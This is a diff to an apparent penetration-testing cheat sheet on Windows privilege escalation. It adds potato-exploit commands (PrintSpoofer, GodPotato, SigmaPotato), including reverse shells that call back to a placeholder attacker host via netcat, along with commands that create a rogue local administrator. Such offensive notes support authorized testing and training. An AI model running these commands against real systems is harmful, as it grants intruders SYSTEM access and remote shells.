@@ -22,15 +22,58 @@ Record current identity, groups and token privileges. A listed privilege alone d
 
 ## Impersonation escalation
 
-When `whoami /priv` shows `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` enabled, the potato family usually escalates. Upload the chosen binary with an Evil-WinRM session, then run it on the target:
+When `whoami /priv` shows `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` enabled — common for service accounts such as `iis apppool\defaultapppool` or `nt authority\network service` — escalate with the potato family. Upload the binary from an Evil-WinRM session, then run it on the target:
 
 ```powershell
-.\PrintSpoofer64.exe -i -c powershell.exe
-.\GodPotato.exe -cmd "cmd.exe"
-.\SigmaPotato.exe --revshell {{LHOST}} {{LPORT}}
+upload PrintSpoofer64.exe
+upload GodPotato.exe
 ```
 
 Match the binary to the target architecture and build; one failure does not rule out the others. Verify the result reports `nt authority\system`. [PrintSpoofer](https://github.com/itm4n/PrintSpoofer), [GodPotato](https://github.com/BeichenDream/GodPotato), [SigmaPotato](https://github.com/tylerdotrar/SigmaPotato).
+
+## PrintSpoofer
+
+`-i` starts the command on a new interactive console; without it the command runs non-interactively and output returns to the current shell:
+
+```powershell
+.\PrintSpoofer64.exe -i -c powershell.exe
+.\PrintSpoofer64.exe -c "cmd /c .\reverse.exe"
+```
+
+For a reverse shell, point `-c` at a prepared [Windows payload](shells/shells#windows-reverse-payload) or netcat and catch it on the [listener](shells/shells#listeners). [PrintSpoofer usage](https://github.com/itm4n/PrintSpoofer#usage).
+
+## GodPotato
+
+Run one command as SYSTEM, or chain a shell:
+
+```powershell
+.\GodPotato.exe -cmd "cmd /c whoami"
+.\GodPotato.exe -cmd "cmd /c .\nc.exe {{LHOST}} {{LPORT}} -e cmd"
+```
+
+Quote the whole `-cmd` value; nested quotes break the call. [GodPotato](https://github.com/BeichenDream/GodPotato).
+
+## SigmaPotato
+
+A current all-in-one binary; hand it a command or ask for a reverse shell:
+
+```powershell
+.\SigmaPotato.exe "cmd /c whoami"
+.\SigmaPotato.exe --revshell {{LHOST}} {{LPORT}}
+```
+
+[SigmaPotato](https://github.com/tylerdotrar/SigmaPotato).
+
+## Create a local administrator
+
+From SYSTEM or an administrator session, mint a new local admin — or promote the account you already own by skipping the first line:
+
+```powershell
+net user '{{USER}}' '{{PASS}}' /add
+net localgroup administrators '{{USER}}' /add
+```
+
+Group membership refreshes only on a new logon; reconnect WinRM afterwards. A local admin enables clean [remote dumping](active-directory/credential-dumping#secretsdump-remotely) and [pass-the-hash](active-directory/credential-access#pass-the-hash) reuse. [Microsoft net user](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/net-user), [net localgroup](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/net-localgroup).
 
 ## Automated enumeration
 
@@ -46,7 +89,7 @@ The C# build requires .NET 4.5.2 or newer. [WinPEAS requirements](https://github
 Run on Kali. Set LPORT to a free HTTP server port, such as 8000. Keep the server running.
 
 ```bash
-cd /usr/share/peass/winpeas/
+cd /home/kali/tools/binaries
 python3 -m http.server {{LPORT}}
 ```
 
@@ -97,3 +140,15 @@ schtasks /query /fo LIST /v
 ```
 
 Record task identity, action and trigger; check the action's file and directory ACLs. [Microsoft query options](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-query).
+
+## Privileged group and host-specific leads
+
+Use whoami /all and the local evidence before selecting a technique:
+
+- [ ] Server Operators: identify a controllable service, executable and restart capability.
+- [ ] DnsAdmins: verify the DNS service context and whether a plugin can be loaded; this normally applies to a DC running DNS.
+- [ ] Backup Operators or SeBackupPrivilege: look for readable SAM/SYSTEM hives and a viable ntds.dit backup path.
+- [ ] SeLoadDriverPrivilege: a usable signed vulnerable driver and compatible OS build are separate prerequisites.
+- [ ] Service accounts: check enabled SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege before choosing a potato variant.
+
+PrintNightmare and ZeroLogon are patch/build-specific checks, not default AD steps. Do not run them without matching version evidence and an authorized objective. [Microsoft whoami](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami), [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview).
